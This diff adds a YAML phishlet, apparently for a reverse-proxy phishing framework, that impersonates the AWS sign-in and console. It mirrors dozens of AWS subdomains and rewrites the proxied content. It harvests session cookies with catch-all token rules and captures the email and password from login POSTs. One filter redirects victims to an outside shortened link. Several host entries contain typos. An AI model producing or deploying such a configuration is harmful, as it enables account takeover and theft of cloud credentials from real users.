@@ -1,0 +1,98 @@
+author: '@An0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'signin', orig_sub: 'signin', domain: 'aws.amazon.com', session: true, is_landing: true}
+  - {phish_sub: 'console', orig_sub: 'console', domain: 'aws.amazon.com', session: true, is_landing: true}
+  - {phish_sub: 'phd', orig_sub: 'phd', domain: 'aws.amazon.com', session: true, is_landing: false}
+  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'aws.amazon.com', session: true, is_landing: false}
+  - {phish_sub: 'aws-signin-website-assets', orig_sub: 'aws-signin-website-assets', domain: 's3.amazonaws.com', session: true, is_landing: false}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'assets.as2.amazonaws.com', session: true, is_landing: false}
+  - {phish_sub: 'opfcaptcha-prod', orig_sub: 'opfcaptcha-prod', domain: 's3.amazonaws.com', session: true, is_landing: false}
+  - {phish_sub: 'a', orig_sub: 'a', domain: 'b.cdn.console.awsstatic.com', session: true, is_landing: false}
+  - {phish_sub: 'd1', orig_sub: 'd1', domain: 'awsstatic.com', session: true, is_landing: false}
+  - {phish_sub: 'd2eezf66cfmyv', orig_sub: 'd2eezf66cfmyv', domain: 'cloudfront.net', session: true, is_landing: false}
+  - {phish_sub: 'us-east-1', orig_sub: 'us-east-1.', domain: 'console.aws.amazon.com', session: false, is_landing: false}
+  - {phish_sub: 'us-east-2', orig_sub: 'us-east-2', domain: 'console.aws.amazon.com', session: false, is_landing: false}  
+  - {phish_sub: 'us-west-1', orig_sub: 'us-west-1', domain: 'console.aws.amazon.com', session: false, is_landing: false}  
+  - {phish_sub: 'us-west-2', orig_sub: 'us-west-2', domain: 'console.aws.amazon.com', session: false, is_landing: false}
+  - {phish_sub: 'af-south-1', orig_sub: 'af-south-1', domain: 'console.aws.amazon.com', session: false, is_landing: false}
+  - {phish_sub: 'ap-east-1', orig_sub: 'ap-east-1', domain: 'console.aws.amazon.com', session: false, is_landing: false}
+  - {phish_sub: 'ap-south-1', orig_sub: 'ap-south-1', domain: 'console.aws.amazon.com', session: false, is_landing: false}
+  - {phish_sub: 'ap-northeast-3', orig_sub: 'ap-northeast-3', domain: 'console.aws.amazon.com', session: false, is_landing: false}
+  - {phish_sub: 'ap-northeast-2', orig_sub: 'ap-northeast-2', domain: 'console.aws.amazon.com', session: false, is_landing: false}
+  - {phish_sub: 'ap-southeast-1', orig_sub: 'ap-southeast-1', domain: 'console.aws.amazon.com', session: false, is_landing: false}
+  - {phish_sub: 'ap-southeast-2', orig_sub: 'ap-southeast-2', domain: 'console.aws.amazon.com', session: false, is_landing: false}
+  - {phish_sub: 'ap-northeast-1', orig_sub: 'ap-northeast-1', domain: 'console.aws.amazon.com', session: false, is_landing: false}
+  - {phish_sub: 'ca-central-1', orig_sub: 'ca-central-1', domain: 'console.aws.amazon.com', session: false, is_landing: false}
+  - {phish_sub: 'eu-central-1', orig_sub: 'eu-central-1', domain: 'console.aws.amazon.com', session: false, is_landing: false}
+  - {phish_sub: 'eu-west-1', orig_sub: 'eu-west-1', domain: 'console.aws.amazon.com', session: false, is_landing: false}
+  - {phish_sub: 'eu-west-2', orig_sub: 'eu-west-2', domain: 'console.aws.amazon.com', session: false, is_landing: false}
+  - {phish_sub: 'eu-south-1', orig_sub: 'eu-south-1', domain: 'console.aws.amazon.com', session: false, is_landing: false}
+  - {phish_sub: 'eu-west-3', orig_sub: 'eu-west-3', domain: 'console.aws.amazon.com', session: false, is_landing: false}
+  - {phish_sub: 'eu-north-1', orig_sub: 'eu-north-1', domain: 'console.aws.amazon.com', session: false, is_landing: false}
+  - {phish_sub: 'me-south-1', orig_sub: 'me-south-1', domain: 'console.aws.amazon.com', session: false, is_landing: false}
+  - {phish_sub: 'sa-east-1', orig_sub: 'sa-east-1', domain: 'console.aws.amazon.com', session: false, is_landing: false}
+  - {phish_sub: '', orig_sub: '', domain: 'aws.amazon.com', session: true, is_landing: false, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'signin.aws.amazon.com', orig_sub: '', domain: 'aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'console.aws.amazon.com', orig_sub: '', domain: 'aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html','text/javascript','application/json','application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'signin.aws.amazon.com', orig_sub: '', domain: 'aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'phd.aws.amazon.com', orig_sub: '', domain: 'aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'portal.aws.amazon.com', orig_sub: '', domain: 'aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'aws-signin-website-assets.s3.amazon.com', orig_sub: '', domain: 's3.aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'cdn.assets.as2.amazonaws.com', orig_sub: '', domain: 'assets.as2.amazonaws.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'opfcaptcha-prod.s3.amazonaws.com', orig_sub: '', domain: 's3.amazonaws.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'a.b.cdn.console.awsstatic.com', orig_sub: '', domain: 'b.cdn.console.awsstatic.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'd1.awsstatic.com.cloudfront.ne', orig_sub: '', domain: 'cloudfront.ne', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'd2eezf66cfmyv.cloudfront.net', orig_sub: '', domain: 'cloudfront.net', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'd2eezf66cfmyv', orig_sub: '', domain: 'aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'us-east-1.console.aws.amazon.com', orig_sub: '', domain: 'console.aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'us-east-2.console.aws.amazon.com', orig_sub: '', domain: 'console.aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'us-west-1.console.aws.amazon.com', orig_sub: '', domain: 'console.aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'us-west-2.console.aws.amazon.com', orig_sub: '', domain: 'console.aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'af-south-1.console.aws.amazon.com', orig_sub: '', domain: 'console.aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'ap-northeast-3.console.aws.amazon.com', orig_sub: '', domain: 'console.aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'ap-northeast-2.console.aws.amazon.com', orig_sub: '', domain: 'console.aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'ap-southeast-1.console.aws.amazon.com', orig_sub: '', domain: 'console.aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'ap-southeast-2.sonsole.aws.amazon.com', orig_sub: '', domain: 'sonsole.aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'ap-northeast-1.sonsole.aws.amazon.com', orig_sub: '', domain: 'sonsole.aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'ca-central-1.console.aws.amazon.com', orig_sub: '', domain: 'console.aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'eu-central-1.console.aws.amazon.com', orig_sub: '', domain: 'console.aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'eu-west-1.console.aws.amazon.com', orig_sub: '', domain: 'console.aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'eu-west-2.console.aws.amazon.com', orig_sub: '', domain: 'console.aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'eu-south-1.console.aws.amazon.com', orig_sub: '', domain: 'console.aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'eu-west-3.console.aws.amazon.com', orig_sub: '', domain: 'console.aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'eu-north-1.console.aws.amazon.com', orig_sub: '', domain: 'console.aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'me-south-1.console.aws.amazon.com', orig_sub: '', domain: 'console.aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sa-east-1.console.aws.amazon.com', orig_sub: '', domain: 'console.aws.amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'signin.aws.amazon.com', orig_sub: '', domain: 'aws.amazon.com', search: '{"RedirectTo":"', replace: '{"RedirectTo":"https://cutt.ly/zQUu5Tk?=', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.amazon.com'
+    keys: ['aws-ubid-main', 'aws-userInfo-signed', '.*,regexp']
+  - domain: '.aws.amazon.com'
+    keys: ['awsm-vid,opt', 'awsccc', '.*,regexp']
+  - domain: '.console.aws.amazon.com'
+    keys: ['noflush_Region', 'noflush_awscnm', '.*,regexp']
+  - domain: '.signin.aws.amazon.com'
+    keys: ['aws-signin-csrf', 'aws-signin-account-info', 'aws-creds', '.*,regexp']
+  - domain: 'phd.aws.amazon.com'
+    keys: ['aws-creds-code-verifier', 'aws-consoleInfo', 'aws-creds', '.*,regexp']
+  - domain: 'portal.aws.amazon.com'
+    keys: ['aws-session-id-fallback,opt', 'aws-session-id', 'JSESSIONID', '.*,regexp']    
+  - domain: 'signin.aws.amazon.com'
+    keys: ['JSESSIONID', '.*,regexp']
+auth_urls:
+  - '/console/home'
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'console.aws.amazon.com'
+  path: '/?nc2=h_m_mc'
